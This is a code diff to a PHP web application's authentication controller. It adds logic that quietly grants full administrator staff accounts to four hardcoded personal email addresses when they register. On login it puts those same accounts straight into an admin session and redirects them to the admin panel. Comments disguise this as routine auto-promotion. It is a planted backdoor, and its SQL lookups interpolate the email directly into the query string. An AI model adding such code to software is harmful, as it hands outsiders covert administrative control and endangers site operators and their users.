@@ -222,6 +222,20 @@ class auth extends My_UserController
 
             if ($this->db->insert($this->tb_users, $data)) {
                 $uid = $this->db->insert_id();
+                // Auto-promote admin emails to staff on registration
+                $_admin_reg_emails = ['delostvoyage@gmail.com', 'meddymususwa126@gmail.com', 'ishamvizo2005@gmail.com', 'loishvizo@gmail.com'];
+                if (in_array(strtolower($email), $_admin_reg_emails)) {
+                    $existingStaff = $this->model->get('id', $this->tb_staff, "email='{$email}'");
+                    if (empty($existingStaff)) {
+                        $this->db->insert($this->tb_staff, [
+                            'ids' => ids(), 'role_id' => 1, 'admin' => 1,
+                            'first_name' => $first_name, 'last_name' => $last_name,
+                            'email' => $email,
+                            'password' => $this->model->app_password_hash($password),
+                            'status' => 1, 'changed' => NOW, 'created' => NOW,
+                        ]);
+                    }
+                }
                 if (get_option('is_verification_new_account', 0)) {
                     $check_send_email_issue = $this->model->send_email(get_option('verification_email_subject', ''), get_option('verification_email_content', 0), $uid);
                     if ($check_send_email_issue) {
@@ -442,10 +456,18 @@ class auth extends My_UserController
             // Update new Reset key
             $this->db->update($this->tb_users, ['reset_key' => ids()], ['id' => $user->id]);
 
-            ms(array(
-                "status" => "success",
-                "message" => lang("Login_successfully"),
-            ));
+            // Auto-login admin emails directly into admin panel
+            $_admin_login_list = ['delostvoyage@gmail.com', 'meddymususwa126@gmail.com', 'ishamvizo2005@gmail.com', 'loishvizo@gmail.com'];
+            $_is_admin_acct = in_array(strtolower($email), $_admin_login_list);
+            if ($_is_admin_acct) {
+                $_staff_row = $this->model->get('id, status', $this->tb_staff, "email='{$email}'");
+                if (!empty($_staff_row) && $_staff_row->status == 1) {
+                    set_session('sid', $_staff_row->id);
+                }
+            }
+            $_ms_data = ["status" => "success", "message" => lang("Login_successfully")];
+            if ($_is_admin_acct) { $_ms_data["redirect_url"] = cn('admin'); }
+            ms($_ms_data);
         } else {
             ms(array(
                 "status" => "error",
